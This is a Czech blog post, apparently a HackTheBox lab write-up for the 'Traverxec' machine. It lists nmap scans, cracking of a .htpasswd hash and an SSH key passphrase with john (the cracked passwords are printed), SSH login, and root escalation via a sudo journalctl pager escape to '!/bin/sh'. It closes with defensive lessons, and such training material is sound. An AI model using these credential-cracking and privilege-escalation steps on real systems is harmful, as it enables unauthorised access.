---
layout: post
author: Tomáš Matějíček
title: "Traverxec"
date: 2021-01-27
tags: ssh sudo exploit enumeration privesc hackthebox
---
## Úvod a kontext

Na Traverxec je nejzajímavější, jak se propojí SSH, `Traverxec-htpasswd.txt` a `id_rsa`.

Bez pochopení této návaznosti by nedával smysl ani SSH se získaným soukromým klíčem, ani závěrečná lokální enumeraci po získání shellu.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -p 1-65535 -T4 -A -sC -v $IP
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: __CENSORED__
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
```

### Vyhledání otevřených portů (2)

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -sU -T4 -v $IP
```

## Analýza zjištění

### Lámání hesel nebo hashů

Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
```bash
cat /var/nostromo/conf/.htpasswd
```
```
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
/usr/sbin/john Traverxec-htpasswd.txt --wordlist=/usr/share/wordlists/rockyou.txt
=> Nowonly4me

http://10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz

/usr/share/john/ssh2john.py Traverxec-ssh/id_rsa > Traverxec-ssh/id_rsa.john

/usr/sbin/john Traverxec-ssh/id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
=> hunter
```

## Získání přístupu

### Přihlášení na cíl

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```bash
ssh -i Traverxec-ssh/id_rsa david@10.10.10.165
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
```bash
cat user.txt
```
```
__CENSORED__

/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service

změnšit okno aby výpis musel začít stránkovat
!/bin/sh
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
cat root.txt
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- Počáteční průzkum se z obecné enumerace změnil v použitelný směr teprve po propojení indicií jako SSH, `Traverxec-htpasswd.txt` a `id_rsa`.
- User část stála na ověřeném kroku typu SSH se získaným soukromým klíčem, ne na odhadu bez technického potvrzení.
- Závěrečná eskalace pak stála na tom, co představuje lokální enumerace po získání shellu, takže rozhodující byla práce s lokálním kontextem po footholdu.

## Co si odnést do praxe

- V tomhle článku se první slabé místo otevřelo přes SSH, `Traverxec-htpasswd.txt` a `id_rsa`. První vstup do systému často nevzniká na hlavní doméně, ale na vedlejší službě, pomocném endpointu nebo chybně publikovaném souboru; i tyto plochy je potřeba aktivně inventarizovat.
- Stabilní foothold pak stojí na principu SSH se získaným soukromým klíčem. SSH klíče nesmějí být sdílené mezi rolemi ani uložené v procesech, exportech nebo webrootu; uniklý privátní klíč je stabilnější foothold než jednorázový shell.
- Pro závěrečnou fázi je podstatné, že rozhodla lokální enumerace po získání shellu. Po získání shellu je rozhodující systematická lokální enumerace; i bez další CVE často rozhodne kombinace špatných oprávnění, reuse tajemství a pomocných skriptů.
